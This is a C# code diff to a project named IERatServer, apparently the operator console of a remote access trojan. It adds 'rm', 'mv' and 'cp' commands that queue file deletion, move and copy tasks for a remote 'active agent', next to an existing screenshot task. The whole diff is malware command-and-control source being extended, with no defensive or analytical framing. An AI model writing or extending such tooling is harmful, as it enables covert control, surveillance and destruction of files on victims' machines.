@@ -75,6 +75,15 @@ namespace IERatServer
             [Command(typeof(ClearCommand), Description = "Clear the console text")]
             clear,
 
+            [Command(typeof(RemoveCommand), Description = "Delete a file")]
+            rm,
+
+            [Command(typeof(MoveCommand), Description = "Move/rename a file")]
+            mv,
+
+            [Command(typeof(CopyCommand), Description = "Copy a file")]
+            cp,
+
             [Command(typeof(HelpCommand), Description = "Display help")]
             help,
 
@@ -117,6 +126,43 @@ namespace IERatServer
             public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
             {
                 AddTaskToActiveAgent("screenshot");
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+
+        class CopyCommand : Command
+        {
+            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "The file to copy")]
+            public string File2Copy { get; set; }
+
+            [PositionalArgument(ArgumentFlags.Required, Position = 1, Description = "The destination file")]
+            public string FileDest { get; set; }
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                AddTaskToActiveAgent("cp", $"{File2Copy}::{FileDest}");
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+        class MoveCommand : Command
+        {
+            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "The file to move / rename")]
+            public string File2Move { get; set; }
+
+            [PositionalArgument(ArgumentFlags.Required, Position = 1, Description = "The destination file")]
+            public string FileDest { get; set; }
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                AddTaskToActiveAgent("mv", $"{File2Move}::{FileDest}");
+                return Task.FromResult(CommandResult.Success);
+            }
+        }
+        class RemoveCommand : Command
+        {
+            [PositionalArgument(ArgumentFlags.Required, Position = 0, Description = "The file to remove")]
+            public string File2Remove { get; set; }
+            public override Task<CommandResult> ExecuteAsync(CancellationToken cancel)
+            {
+                AddTaskToActiveAgent("rm", File2Remove);
                 return Task.FromResult(CommandResult.Success);
             }
         }
